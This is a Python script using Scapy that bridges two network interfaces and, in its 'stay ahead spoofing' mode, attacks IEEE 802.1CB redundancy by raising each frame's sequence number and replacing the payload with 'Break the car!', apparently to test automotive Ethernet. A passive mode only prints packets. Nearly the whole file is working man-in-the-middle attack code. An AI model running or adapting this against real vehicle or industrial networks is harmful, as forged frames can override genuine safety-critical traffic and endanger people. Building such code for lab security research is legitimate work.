# Documentation: https://github.com/secdev/scapy
# More: https://scapy.readthedocs.io/en/latest/api/scapy.packet.html
# More: https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html
# More: https://scapy.readthedocs.io/en/latest/build_dissect.html
# Page 49 of the IEEE 802.1CB standard

import time
import sys

from scapy.packet import Raw

from RedundancyTag import RedundancyTag
from scapy.sendrecv import bridge_and_sniff


def determine_attack():
    """
    This function determines the attack that will be performed.
    """
    attack = 0
    if len(sys.argv) > 1:
        try:
            attack = int(sys.argv[1])
        except ValueError:
            print("Invalid attack number. Defaulting to passive mode.")
    else:
        print("No attack number provided. Defaulting to passive mode.")

    if attack == 1:
        """The attacker uses spoofing to create new packets within
        the network with existing sequence numbers that arrive
        earlier than the correct packets."""
        print("Stay ahead spoofing is enabled.")
        return stay_ahead
    else:
        print("Passive mode is enabled.")
        return passive


def passive(pkt):
    """
    This function is the passive mode.
    """
    pkt.show()
    return pkt.haslayer(RedundancyTag)


def stay_ahead(pkt):
    """
    This function modifies packets by increasing the sequence
    number by 1, and changing the payload.
    """
    if pkt.haslayer(RedundancyTag):
        pkt[RedundancyTag].SequenceNumber += 1
        debug_number = pkt[Raw].load.decode("utf-8").split(' ')[0]
        pkt[Raw].load = debug_number + " Break the car!"
        return pkt
    else:
        return False


attack_method = determine_attack()
time.sleep(1)

bridge_and_sniff(if1="eth0", if2="eth1", xfrm12=attack_method)
